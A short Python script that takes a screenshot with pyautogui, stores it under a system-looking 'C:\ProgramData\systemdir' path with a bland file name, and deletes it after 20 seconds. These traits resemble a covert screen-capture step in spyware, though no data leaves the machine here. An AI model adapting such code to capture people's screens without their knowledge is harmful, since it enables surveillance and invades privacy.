import pyautogui
import secrets
import os
try:
    os.remove("C:\ProgramData\systemdir\strfile.png")
except:
    pass
rs = secrets.token_hex(6)
sc = pyautogui.screenshot()
sc.save(f'C:\ProgramData\systemdir\strfile.png')
asr = f"C:\ProgramData\systemdir\strfile.png"
import os
import time
time.sleep(20)
os.remove(asr)